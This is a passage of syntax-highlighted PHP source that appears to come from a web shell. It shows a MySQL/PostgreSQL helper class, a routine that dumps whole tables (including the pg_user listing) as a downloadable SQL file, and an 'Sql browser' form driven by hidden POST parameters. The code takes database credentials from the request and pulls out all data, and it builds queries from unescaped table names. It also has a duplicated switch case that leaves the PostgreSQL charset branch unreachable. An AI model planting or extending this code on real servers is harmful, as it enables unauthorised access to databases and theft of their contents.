<span class="lineno">1088</span>                     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">5432</span><span class="p">;</span> 
<span class="lineno">1089</span>                     <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1090</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1091</span>             <span class="p">}</span> 
<span class="lineno">1092</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1093</span>         <span class="p">}</span> 
<span class="lineno">1094</span>         <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1095</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1096</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1097</span>                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1098</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1099</span>             <span class="p">}</span> 
<span class="lineno">1100</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1101</span>         <span class="p">}</span> 
<span class="lineno">1102</span>         <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1103</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1104</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1105</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1106</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1107</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1108</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1109</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1110</span>             <span class="p">}</span> 
<span class="lineno">1111</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1112</span>         <span class="p">}</span> 
<span class="lineno">1113</span>         <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1114</span>             <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span><span class="o">?</span><span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span><span class="p">;</span> 
<span class="lineno">1115</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1116</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1117</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1118</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1119</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1120</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1121</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1122</span>             <span class="p">}</span> 
<span class="lineno">1123</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1124</span>         <span class="p">}</span> 
<span class="lineno">1125</span>         <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1126</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1127</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1128</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1129</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1130</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1131</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database&quot;</span><span class="p">);</span> 
<span class="lineno">1132</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1133</span>             <span class="p">}</span> 
<span class="lineno">1134</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1135</span>         <span class="p">}</span> 
<span class="lineno">1136</span>         <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1137</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1138</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1139</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span> 
<span class="lineno">1140</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1141</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1142</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where (table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;) or table_name = &#39;pg_user&#39;&quot;</span><span class="p">);</span> 
<span class="lineno">1143</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1144</span>             <span class="p">}</span> 
<span class="lineno">1145</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1146</span>         <span class="p">}</span> 
<span class="lineno">1147</span>         <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1148</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1149</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1150</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1151</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1152</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1153</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1154</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1155</span>             <span class="p">}</span> 
<span class="lineno">1156</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1157</span>         <span class="p">}</span> 
<span class="lineno">1158</span>         <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1159</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1160</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1161</span>                     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span> 
<span class="lineno">1162</span>                         <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1163</span>                     <span class="k">else</span> 
<span class="lineno">1164</span>                         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1165</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1166</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1167</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1168</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1169</span>             <span class="p">}</span> 
<span class="lineno">1170</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1171</span>         <span class="p">}</span> 
<span class="lineno">1172</span>         <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1173</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1174</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1175</span>                     <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span> 
<span class="lineno">1176</span>                     <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1177</span>                     <span class="k">echo</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1178</span>                     <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span> 
<span class="lineno">1179</span>                     <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1180</span>                         <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno">1181</span>                         <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1182</span>                             <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1183</span>                             <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span> 
<span class="lineno">1184</span>                         <span class="p">}</span> 
<span class="lineno">1185</span>                     <span class="k">echo</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1186</span>                     <span class="p">}</span> 
<span class="lineno">1187</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1188</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1189</span>                     <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">);</span> 
<span class="lineno">1190</span>                     <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1191</span>                         <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno">1192</span>                         <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1193</span>                             <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1194</span>                             <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> 
<span class="lineno">1195</span>                         <span class="p">}</span> 
<span class="lineno">1196</span>                     <span class="k">echo</span> <span class="s1">&#39;INSERT INTO &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1197</span>                     <span class="p">}</span> 
<span class="lineno">1198</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1199</span>             <span class="p">}</span> 
<span class="lineno">1200</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1201</span>         <span class="p">}</span> 
<span class="lineno">1202</span>     <span class="p">};</span> 
<span class="lineno">1203</span>     <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span> 
<span class="lineno">1204</span>     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1205</span>         <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> 
<span class="lineno">1206</span>         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1207</span>         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1208</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span> 
<span class="lineno">1209</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span> 
<span class="lineno">1210</span>         <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno">1211</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
<span class="lineno">1212</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">1213</span>     <span class="p">}</span> 
<span class="lineno">1214</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno">1215</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1216</span> <span class="x">    &lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno">1217</span> <span class="x">    &lt;form name=&quot;sf&quot; method=&quot;post&quot;&gt; </span>
<span class="lineno">1218</span> <span class="x">        &lt;table cellpadding=&quot;2&quot; cellspacing=&quot;0&quot;&gt; </span>
<span class="lineno">1219</span> <span class="x">            &lt;tr&gt; </span>
<span class="lineno">1220</span> <span class="x">                &lt;td&gt;Type&lt;/td&gt; </span>
<span class="lineno">1221</span> <span class="x">                &lt;td&gt;Host&lt;/td&gt; </span>
<span class="lineno">1222</span> <span class="x">                &lt;td&gt;Login&lt;/td&gt; </span>
<span class="lineno">1223</span> <span class="x">                &lt;td&gt;Password&lt;/td&gt; </span>
<span class="lineno">1224</span> <span class="x">                &lt;td&gt;Database&lt;/td&gt; </span>
<span class="lineno">1225</span> <span class="x">                &lt;td&gt;&lt;/td&gt; </span>
<span class="lineno">1226</span> <span class="x">            &lt;/tr&gt; </span>
<span class="lineno">1227</span> <span class="x">            &lt;tr&gt; </span>
<span class="lineno">1228</span> <span class="x">                &lt;input type=hidden name=a value=Sql&gt; </span>
<span class="lineno">1229</span> <span class="x">                &lt;input type=hidden name=p1 value=&#39;query&#39;&gt; </span>
<span class="lineno">1230</span> <span class="x">                &lt;input type=hidden name=p2&gt; </span>
<span class="lineno">1231</span> <span class="x">                &lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno">1232</span> <span class="x">                &lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno">1233</span> <span class="x">                &lt;td&gt; </span>
<span class="lineno">1234</span> <span class="x">                    &lt;select name=&#39;type&#39;&gt; </span>
<span class="lineno">1235</span> <span class="x">                        &lt;option value=&quot;mysql&quot; </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&gt;MySql&lt;/option&gt; </span>
<span class="lineno">1236</span> <span class="x">                        &lt;option value=&quot;pgsql&quot; </span><span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;pgsql&#39;</span><span class="p">)</span><span class="k">echo</span> <span class="s1">&#39;selected&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&gt;PostgreSql&lt;/option&gt; </span>
<span class="lineno">1237</span> <span class="x">                    &lt;/select&gt;&lt;/td&gt; </span>
<span class="lineno">1238</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_host value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;localhost&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1239</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_login value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;root&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1240</span> <span class="x">                &lt;td&gt;&lt;input type=text name=sql_pass value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">]));</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;/td&gt; </span>
<span class="lineno">1241</span> <span class="x">                &lt;td&gt; </span>
<span class="lineno">1242</span> <span class="x">    </span><span class="cp">&lt;?php</span> 
<span class="lineno">1243</span>     <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&lt;input type=text name=sql_base value=&#39;&#39;&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1244</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">])){</span> 
<span class="lineno">1245</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno">1246</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno">1247</span>                 <span class="k">case</span> <span class="s2">&quot;Windows-1251&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp1251&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1248</span>                 <span class="k">case</span> <span class="s2">&quot;UTF-8&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1249</span>                 <span class="k">case</span> <span class="s2">&quot;KOI8-R&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8r&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1250</span>                 <span class="k">case</span> <span class="s2">&quot;KOI8-U&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;koi8u&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1251</span>                 <span class="k">case</span> <span class="s2">&quot;cp866&quot;</span><span class="o">:</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">setCharset</span><span class="p">(</span><span class="s1">&#39;cp866&#39;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1252</span>             <span class="p">}</span> 
<span class="lineno">1253</span>             <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">listDbs</span><span class="p">();</span> 
<span class="lineno">1254</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;select name=sql_base&gt;&lt;option value=&#39;&#39;&gt;&lt;/option&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1255</span>             <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1256</span>                 <span class="k">list</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span> 
<span class="lineno">1257</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$value</span><span class="o">==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
